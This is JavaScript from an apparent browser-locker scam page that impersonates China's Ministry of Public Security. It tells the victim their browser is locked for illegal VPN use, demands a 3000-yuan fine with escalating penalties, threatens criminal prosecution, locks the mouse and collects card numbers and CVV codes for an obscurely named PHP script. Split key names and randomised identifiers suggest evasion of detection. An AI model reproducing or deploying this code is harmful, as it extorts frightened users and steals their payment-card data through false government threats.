var text2 = '⽹络安全部⻔的提示：<br>\n' +
    '检测到您正在使⽤中华⼈⺠共和国法律禁⽌的 VPN 代理。<br>\n' +
    '您的浏览器已被锁定。<br>\n' +
    '初次警告，只需完成基础罚款3000元。<br>\n' +
    '延期⽀付将按照滞留处理，滞留⾦将按照罚款⾦额的2%增⻓，直⾄缴纳罚款，最终不<br>\n' +
    '超过罚款⾦额的百分之200%<br>\n' +
    '支付罚款后，您的浏览器将自动解禁。';

var text3 = '注意！！！如果您未能⽀付罚款或试图在未⽀付罚款的情况下解锁计算机，您设备上<br>\n' +
    '的记录信息将被提交⾄当地公安系统，并将按照司法程序对你执⾏刑事指控。';


var dfbnhfj = '{"title": "中华人民共和国公安部",' +
    '"alertMsg":"您的电脑已锁定。",' +
    '"mouseL' + 'ock": "true",' +
    '"selector":"#LKMkuYftYUyioijTrytfuJ",' +
    '"targetScript":"LKukytfrCdtryctrt.php",' +
    '"successLnkTitle": "download receipt",' +
    '"url" : "https://www.mps.gov.cn/",' +
    '"resolution": "",' +
    '"secondBlock": "",' +
    '"ca' + 'rdPlaceholder": "****   ****   ****   ****", ' +
    '"cv' + 'vPlaceholder": "Code", ' +
    '"fourthBlock": "", ' +
    '"timeText": "您有 12 个小时的时间缴纳罚款。", ' +
    '"timer": "Access code received by SMS"}';

var jsnDec = JSON.parse(dfbnhfj);
jsnDec.secondBlock = text2;
jsnDec.fourthBlock = text3;
dfbnhfj = JSON.stringify(jsnDec);
